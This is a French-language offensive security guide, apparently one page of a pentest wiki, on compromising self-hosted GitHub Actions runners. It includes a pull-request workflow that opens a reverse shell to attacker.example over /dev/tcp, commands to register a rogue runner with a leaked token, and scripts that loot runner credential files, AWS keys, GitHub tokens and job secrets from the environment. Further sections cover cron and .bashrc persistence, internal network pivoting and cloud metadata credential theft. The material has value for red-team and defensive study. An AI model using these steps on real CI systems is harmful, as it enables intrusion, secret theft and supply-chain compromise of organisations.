---
title: "Prise de contrôle d'un runner auto-hébergé : RCE et persistance sur les hôtes de runner CI"
order: 5
description: "Obtenir l'exécution de code sur des runners GitHub Actions auto-hébergés non éphémères via des workflows de pull request, enregistrer un runner malveillant avec un token d'enregistrement fuité, piller les répertoires de travail et d'identifiants du runner, et pivoter dans le réseau interne."
keywords:
  - self-hosted runner
  - runs-on self-hosted
  - runner registration token
  - _work directory
  - CI network pivot
---

# Prise de contrôle d'un runner auto-hébergé

Un runner auto-hébergé est une machine que l'org exploite pour exécuter des jobs Actions, et elle se trouve généralement à l'intérieur du réseau d'entreprise. Deux propriétés en font une cible de choix : il exécute du **code de workflow de PR non fiable** quand un dépôt accepte les contributions issues de forks, et il est **non éphémère par défaut**, conservant ainsi son état (et votre implant) entre les jobs. Faire atterrir un job sur un tel runner, c'est obtenir une RCE sur un hôte, sur une infrastructure que les pare-feux considèrent généralement comme digne de confiance.

## Empreinte

Trouvez les dépôts qui routent des jobs vers des runners auto-hébergés et acceptent des PR externes :

```bash
# Workflows targeting self-hosted runners
for f in $(gh api /repos/ACME/service/contents/.github/workflows -q '.[].path'); do
  gh api "/repos/ACME/service/contents/$f" -q '.content' | base64 -d | grep -Hn 'runs-on:.*self-hosted' && echo "  <- $f"
done

# Org/repo runners (needs admin: lists online runners and labels)
gh api /orgs/ACME/actions/runners -q '.runners[] | [.name, .status, (.labels|map(.name)|join(","))] | @tsv'
gh api /repos/ACME/service/actions/runners
```

`runs-on: [self-hosted, linux, x64]` combiné à un dépôt qui exécute des workflows sur `pull_request` (et pas seulement `pull_request_target`) est la voie directe : le workflow d'une PR issue d'un fork s'exécute sur leur matériel.

## RCE via un workflow de pull request

Lorsqu'un dépôt exécute la CI sur `pull_request` et que cette CI cible un runner auto-hébergé, une PR qui modifie le workflow ou n'importe quel script qu'il appelle s'exécute sur l'hôte du runner. Le plus propre est une PR qui ajoute ou modifie un job faisant atterrir un reverse shell :

```yaml
# .github/workflows/ci.yml as submitted in the attacker's PR
on: [pull_request]
jobs:
  test:
    runs-on: [self-hosted, linux]      # their machine, not GitHub's
    steps:
      - run: |
          id; hostname; ip a                                  # confirm where we landed
          bash -c 'exec 5<>/dev/tcp/attacker.example/4444; cat <&5 | bash >&5 2>&5 &'
```

Quand la CI du mainteneur exécute la PR (ou qu'un workflow exécute les PR issues de forks sans approbation), `test` s'exécute sur le runner. `id`/`hostname`/`ip a` dans le log confirment l'hôte, l'utilisateur et le fait que vous êtes à l'intérieur du réseau interne. Parce que le runner est non éphémère, une entrée cron ou un `~/.bashrc` modifié déposé ici survit dans les jobs ultérieurs de chaque dépôt qui utilise le runner.

## Enregistrer un runner malveillant

Si vous récupérez un **token d'enregistrement de runner** (à durée de vie courte, limité à l'ajout de runners) ou pouvez en demander un avec un token admin, vous rattachez votre propre machine en tant que runner et recevez des jobs, y compris ceux porteurs de secrets :

```bash
# Mint a registration token (needs admin on the org/repo)
gh api -X POST /orgs/ACME/actions/runners/registration-token -q .token
# -> AADD... (valid ~1h)

# On an attacker host, register against the org and run jobs
./config.sh --url https://github.com/ACME --token AADD... --labels self-hosted,linux --unattended
./run.sh
```

Une fois enregistré avec des labels correspondants, votre hôte devient éligible pour tout job qui cible ces labels ; les jobs arrivent avec leur `GITHUB_TOKEN` et les secrets injectés dans l'environnement, vous remettant les identifiants de workflows que vous n'avez jamais écrits.

## Piller un runner sous contrôle

Une fois atterri sur un runner légitime, le système de fichiers détient le reste des secrets CI de l'org :

```bash
# The agent install dir (commonly /actions-runner or /home/<user>/actions-runner)
R=$(dirname "$(readlink -f "$(pgrep -af Runner.Listener | awk '{print $NF}' | head -1)")" 2>/dev/null)
cat "$R/.credentials" "$R/.credentials_rsaparams" "$R/.runner" 2>/dev/null   # runner identity + keys
ls -la "$R/_work"                                                            # checked-out repos + build state
grep -rIER 'AKIA|ghp_|ghs_|BEGIN .*PRIVATE KEY|token' "$R/_work" 2>/dev/null
env | grep -iE 'token|secret|key'                                           # live job secrets in the process env
```

`.credentials` / `.credentials_rsaparams` sont l'authentification propre du runner auprès de GitHub ; `_work` contient chaque dépôt que le runner a construit ainsi que tous les secrets que ces builds ont écrits sur le disque. Les environnements d'autres processus sur un runner occupé exposent les secrets de jobs en cours d'exécution.

## Suites

- **Pivot réseau** : le runner se trouve à l'intérieur du réseau interne, avec des routes qu'un runner hébergé par GitHub n'a jamais ; utilisez-le pour atteindre des services internes, des endpoints de métadonnées sur les runners hébergés dans le cloud (IMDS pour les clés de rôle d'instance) et des registres de paquets.
- **Vol de secrets et de tokens** : le `GITHUB_TOKEN` et les secrets injectés depuis les jobs alimentent [l'abus de token et de GITHUB_TOKEN](token-and-github-token-abuse.md) et les poussées de supply chain.
- **Persistance** : parce que l'hôte est non éphémère, un implant déposé, un binaire de runner modifié ou un runner malveillant enregistré donnent un accès CI durable qui réapparaît à chaque job suivant.

## Notes d'exploitation

- `pull_request` + `self-hosted` est l'appariement dangereux : les PR issues de forks s'exécutent sur leur matériel. `pull_request_target` sur un runner auto-hébergé est pire encore (token en écriture plus RCE sur l'hôte).
- Les runners par défaut sont non éphémères : l'état persiste entre les jobs, donc la persistance est triviale et les secrets de jobs d'autres dépôts s'accumulent dans `_work` et dans les environnements de processus.
- Un token d'enregistrement suffit à rattacher votre propre runner et à collecter passivement les jobs et leurs secrets ; vous n'avez pas besoin de compromettre un hôte existant.
- Les runners auto-hébergés hébergés dans le cloud exposent le service de métadonnées d'instance à votre job ; récupérez les identifiants de rôle d'instance pour un pivot cloud immédiat.

## Outils

- **gato** (Praetorian) : détecte les dépôts dont les workflows atteignent des runners auto-hébergés et peut soumettre des workflows de PoC.
- **actions/runner** : l'agent officiel (`config.sh`/`run.sh`) utilisé pour enregistrer un runner malveillant.
- **runner-poisoning / Gato-X** : outillage autour de la persistance sur runner non éphémère et de l'interception de jobs.

## Références

- [GitHub : sécurité des runners auto-hébergés et workflows non fiables](https://docs.github.com/en/actions/how-tos/manage-runners/self-hosted-runners/manage-access)
- [GitHub REST API : runners auto-hébergés et tokens d'enregistrement](https://docs.github.com/en/rest/actions/self-hosted-runners)
- [Praetorian : prise de contrôle d'un runner auto-hébergé avec Gato](https://www.praetorian.com/blog/self-hosted-github-runners-are-backdoors/)
- [Synacktiv : compromettre les runners auto-hébergés GitHub](https://www.synacktiv.com/en/publications/github-actions-exploitation-self-hosted-runners.html)
- [GitHub Security Lab : une attaque de supply chain pour les gouverner toutes (runners)](https://securitylab.github.com/resources/github-actions-building-blocks/)
